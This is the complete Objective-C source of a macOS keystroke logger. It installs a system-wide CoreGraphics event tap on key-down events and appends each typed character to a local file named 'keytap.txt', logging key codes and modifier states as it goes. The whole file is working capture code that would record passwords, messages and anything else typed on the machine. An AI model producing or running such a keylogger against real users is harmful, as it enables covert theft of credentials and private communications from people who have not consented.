#import <Foundation/Foundation.h>
#import <CoreGraphics/CoreGraphics.h>
#import <Cocoa/Cocoa.h>

#define LOG_FILE "keytap.txt"

// NSWindow *window;
NSProcessInfo* processInfo;
CFMachPortRef tap;
CFRunLoopSourceRef source;
CFRunLoopRef ref;

CGEventRef _Nullable eventCallback(CGEventTapProxy proxy, CGEventType eventType, CGEventRef event, void *userInfo)
{
    CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
    CGEventFlags flags = CGEventGetFlags(event);

    // Translate keyCode based on our current keyboard layout and write to file.
    FILE* file = (FILE*) userInfo;
    UniCharCount actualStringLength = 0;
    UniChar unicodeString[2];
    CGEventKeyboardGetUnicodeString(event, 2, &actualStringLength, unicodeString);
    NSString* test = [NSString stringWithFormat: @"%C", unicodeString[0]];
    const char* c = [test UTF8String];
    NSLog(@"%lu %C %s %lu", actualStringLength, unicodeString[0], c, strlen(c));
    unsigned char b = (unsigned char) c[0];

    // Check so we have a character or linebreak
    if (b >= 31 && b < 255 || (b == 10 || b == 13)) {
        NSLog(@"Writing to file %s %lu", c, strlen(c));
        fprintf(file, "%c", c[0]);
        fflush(file);
    }

    // Check so this is a keydown event & check if capslock or shift keys are pressed.
    if (eventType == kCGEventKeyDown) {
        NSLog(@"Callback triggered: %d %d", keyCode, (int) flags);
        if (flags & kCGEventFlagMaskAlphaShift) {
            NSLog(@"Capslock is down");
        }
        if (flags & kCGEventFlagMaskShift) {
            NSLog(@"Shift is down");
        }
    }
    return event;
}

void cleanup(CFMachPortRef tap, CFRunLoopRef ref, CFRunLoopSourceRef source)
{
    // Cleanup our tap.
    CGEventTapEnable(tap, false);
    CFRunLoopRemoveSource(ref, source, kCFRunLoopCommonModes);
    CFRelease(source);
    CFRelease(tap);
}

void sigHandler(int sig) {
    // Stop our loop on CTRL-C
    CFRunLoopStop(ref);
    usleep(50);
}

int main(int argc, char** argv)
{
    // Get process information
    processInfo = [NSProcessInfo processInfo];
    NSString *processName = [processInfo processName];
    int processID = [processInfo processIdentifier];
    NSLog(@"%@ %d", processName, processID);

    // Install signal handler
    signal(SIGINT, sigHandler);

    // Create borderless window
    // NSRect frame = NSMakeRect(100, 100, 200, 200);
    // NSUInteger styleMask = NSWindowStyleMaskDocModalWindow;
    // NSRect rect = [NSWindow contentRectForFrameRect:frame styleMask:styleMask];
    // NSWindow * window = [[NSWindow alloc] initWithContentRect:rect styleMask:styleMask backing: NSBackingStoreBuffered    defer:false];
    // [window setBackgroundColor:[NSColor blueColor]];
    // [window makeKeyAndOrderFront: window];

    // File to log keystrokes into.
    FILE* file = fopen(LOG_FILE, "a");
    void* userInfo = (void*) file;

    // Create a tap for keyboard events.
    CGEventMask mask = CGEventMaskBit(kCGEventKeyDown);
    tap = CGEventTapCreate(
        kCGHIDEventTap,
        kCGHeadInsertEventTap,
        kCGEventTapOptionListenOnly,
        mask,
        eventCallback,
        userInfo
    );
    ref = CFRunLoopGetCurrent();
    source = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, tap, 0);
    CFRunLoopAddSource(ref, source, kCFRunLoopCommonModes);
    CGEventTapEnable(tap, true);

    // Run loop.
    CFRunLoopRun();

    cleanup(tap, ref, source);
    fclose(file);
}
